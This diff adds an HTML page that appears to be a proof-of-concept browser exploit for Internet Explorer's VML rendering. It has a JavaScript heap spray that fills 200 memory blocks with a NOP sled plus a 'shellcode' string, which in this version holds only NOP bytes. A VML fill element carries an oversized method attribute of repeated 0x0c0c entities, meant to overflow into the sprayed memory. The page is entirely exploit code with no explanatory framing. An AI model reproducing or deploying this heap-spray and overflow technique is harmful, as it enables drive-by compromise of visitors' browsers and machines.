@@ -1,0 +1,38 @@
+<html xmlns:v="urn:shcemas-microsoft-com:vml">
+
+<head>
+<title>Random</title>
+<style>
+<!-- v\:* {behavior: url(#default#VML); } -->
+</style>
+</head>
+
+<script language="javascript">
+ //
+	var shellcode="\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090";
+
+	var nop = "\u9090\u9090";
+	alert(nop.length);
+	while(nop.length<=0x100000/2)
+	{
+		nop+=nop;
+	}
+
+	nop = nop.substring(0,0x100000/2-32/2-4/2-shellcode.length-2/2);
+	var slide = new Array();
+	for(var i=0;i<200;i++)
+	{
+		slide[i] =nop+shellcode;
+	}
+ ///
+</script>
+
+
+
+<body>
+<v:rect style="width:44pt;height:44pt" fillcolor="black" >
+<v:fill method="&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c&#x0c0c"/>
+</v:rect>
+</body>
+
+</html>
